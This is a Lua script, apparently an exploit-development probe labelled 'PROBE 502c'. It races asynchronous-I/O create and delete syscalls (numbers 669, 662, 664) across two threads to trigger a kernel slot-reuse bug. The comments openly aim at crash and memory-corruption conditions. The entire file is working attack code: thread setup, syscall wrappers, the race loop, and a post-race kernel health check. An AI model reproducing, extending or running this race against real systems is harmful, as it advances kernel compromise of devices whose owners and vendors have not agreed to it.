-- CRASH_CLASS: HIGH
-- PROBE 502c: create hammers the table lock while the parent deletes
--
-- The delete invalidates its slot, drops the table lock and re-reads the slot by
-- index. A create that is already queued on that lock runs its slot allocation
-- first, so the delete's second lookup sees the replacement object. The helper
-- therefore only creates; the parent supplies the deletes. The helper stops well
-- below the workload that killed 502b's control.
print("=== PROBE 502c: aio create vs delete ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(a) return string.format("0x%X", a) end
local N = 8
local ids  = memory.alloc(0x80)
local ids2 = memory.alloc(0x200)
local data = memory.alloc(0x200)
local out  = memory.alloc(0x40)
local res1 = memory.alloc(0x200)
local gate = memory.alloc(0x40)
local health = memory.alloc(0x40)
for o = 0, 0x3C, 4 do pcall(function() memory.write_dword(gate + o, 0) end) end
for o = 0, 0x1FC, 4 do pcall(function() memory.write_dword(data + o, 0) end) end

local A, D, O = hx(to_num(ids)), hx(to_num(data)), hx(to_num(out))
local R1, G = hx(to_num(res1)), hx(to_num(gate))
local B2, H = hx(to_num(ids2)), hx(to_num(health))

local body = ([[
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local c = make_syscall(669)
local DATA, OUT, GATE, IDS2 = %s, %s, %s, %s
local function rd(a) return to_num(memory.read_dword(a)) end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
while rd(GATE) == 0 do end
for i = 1, 300 do
  wr(OUT, 0)
  pcall(function() c(1, DATA, 1, 1, OUT) end)
  local id = rd(OUT)
  if id ~= 0 then wr(IDS2 + ((i - 1) %% 64) * 4, id) end
  if i %% 50 == 0 then wr(GATE + 0x10, i) end
end
wr(GATE + 8, 1)
]]):format(D, O, G, B2)

local thr = run_lua_code_in_new_thread(body, { async = true })
local sc_c, sc_d, sc_p = make_syscall(669), make_syscall(662), make_syscall(664)
local made = 0
for i = 0, N - 1 do
  pcall(function() memory.write_dword(out, 0) end)
  pcall(function() sc_c(1, uint64(D), 1, 1, uint64(O)) end)
  local id = to_num(memory.read_dword(out))
  if id ~= 0 then pcall(function() memory.write_dword(ids + i * 4, id) end); made = made + 1 end
end
print("created=" .. made .. " ids=" .. tostring(to_num(memory.read_dword(ids))))
pcall(function() sc_p(uint64(A), N, uint64(hx(to_num(res1)))) end)
pcall(function() memory.write_dword(gate, 1) end)
local lastok, firstpass = 0, nil
for pass = 1, 300 do
  local ok, ret = pcall(function() return sc_d(uint64(A), N, uint64(R1)) end)
  if ok then lastok = pass end
  if pass == 1 then
    local s = {}
    for i = 0, N - 1 do s[#s + 1] = string.format("%X", to_num(memory.read_dword(R1 + i * 4))) end
    firstpass = table.concat(s, ",")
  end
  if pass % 50 == 0 then
    print(string.format("pass %d helper-created=%d ok=%s", pass, to_num(memory.read_dword(gate + 0x10)), tostring(ok)))
  end
end
print("firstpass=" .. tostring(firstpass) .. " lastok=" .. lastok)
local spins = 0
while to_num(memory.read_dword(gate + 8)) == 0 and spins < 2000000 do spins = spins + 1 end
print("helper done=" .. tostring(to_num(memory.read_dword(gate + 8))) .. " created=" .. to_num(memory.read_dword(gate + 0x10)))
local clean, bad = 0, 0
for i = 0, 7 do
  pcall(function() memory.write_dword(out, 0) end)
  pcall(function() sc_c(1, uint64(D), 1, 1, uint64(O)) end)
  local id = to_num(memory.read_dword(out))
  if id ~= 0 then
    pcall(function() memory.write_dword(health, id) end)
    pcall(function() sc_p(uint64(hx(to_num(health))), 1, uint64(hx(to_num(res1)))) end)
    local okd = pcall(function() return sc_d(uint64(hx(to_num(health))), 1, uint64(R1)) end)
    if okd and to_num(memory.read_dword(R1)) == 0 then clean = clean + 1 else bad = bad + 1 end
  else
    bad = bad + 1
  end
end
print(string.format("health: clean=%d bad=%d", clean, bad))
print("=== PROBE 502c COMPLETE ===")
